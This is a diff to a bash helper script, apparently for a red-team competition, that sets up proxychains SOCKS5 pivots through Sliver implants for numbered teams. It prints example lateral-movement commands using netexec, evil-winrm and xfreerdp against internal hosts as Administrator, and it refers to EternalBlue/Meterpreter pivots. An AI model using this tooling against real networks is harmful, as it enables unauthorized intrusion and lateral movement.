@@ -4,6 +4,9 @@
 # Usage: ./pivot.sh <team_number> [port]
 #   e.g. ./pivot.sh 5          → starts SOCKS on 1085
 #   e.g. ./pivot.sh 5 1090     → custom port
+#
+# For EternalBlue / Meterpreter pivots, use ligo.sh instead.
+# This script is for Sliver-based SOCKS5 pivots.
 # ================================================
 
 if [[ -z "$1" ]]; then
@@ -16,6 +19,16 @@ fi
 TEAM="$1"
 PORT="${2:-108${TEAM}}"   # 1085 for team 5, 1084 for team 4, etc.
 DOMAIN="aperturesciencelabs.org"
+
+# Check for port conflict (ligo.sh defaults to 109<TEAM>)
+if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
+  echo "[!] WARNING: Port ${PORT} is already in use!"
+  echo "    If ligo.sh (Meterpreter) is running, it defaults to port 109${TEAM}."
+  echo "    Specify a different port:  $0 ${TEAM} <port>"
+  echo ""
+  read -rp "    Continue anyway? [y/N] " ans
+  [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; exit 1; }
+fi
 
 echo "[+] ================================================"
 echo "[+] Switching to TEAM ${TEAM} pivot (SOCKS5 on 127.0.0.1:${PORT})"
@@ -42,15 +55,20 @@ socks5 127.0.0.1 ${PORT}
 EOF
 
 echo "[+] Created /tmp/proxychains_team${TEAM}.conf"
+
+# Set up aliases that don't conflict with ligo.sh's pc<N>/p<N>
 echo ""
 echo "[+] NOW USE THESE ALIASES / COMMANDS:"
-echo "    alias p${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'"
-echo "    p${TEAM} crackmapexec smb 172.16.3.140 -u PortalGod -p '' -d ${DOMAIN} -k"
-echo "    p${TEAM} evil-winrm -i 172.16.1.11 -u PortalGod -p ''"
-echo "    p${TEAM} xfreerdp /v:172.16.1.10 /u:PortalGod@${DOMAIN} /cert-ignore"
+echo "    alias pp${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'   # sliver pivot"
+echo "    alias p${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'    # shorthand"
 echo ""
-echo "[+] Pro tip: Add this alias permanently to your ~/.bashrc:"
-echo "    alias pivot='~/pivot.sh'"
+echo "    pp${TEAM} netexec smb 172.16.3.140 -u Administrator -p 'pass' -d ${DOMAIN}"
+echo "    pp${TEAM} evil-winrm -i 172.16.1.11 -u Administrator -p 'pass'"
+echo "    pp${TEAM} xfreerdp /v:172.16.1.10 /u:Administrator@${DOMAIN} /cert-ignore"
+echo ""
+echo "[+] NOTE: ligo.sh (Meterpreter) uses SOCKS 109${TEAM} with aliases pc${TEAM}/p${TEAM}"
+echo "    This script (Sliver) uses SOCKS ${PORT} with alias pp${TEAM}"
+echo "    Both can run simultaneously for the same team."
 echo ""
 echo "[+] You can now run commands on ANY internal IP for team ${TEAM} instantly."
 echo "[+] Open tmux panes for multiple teams at once — zero conflict."
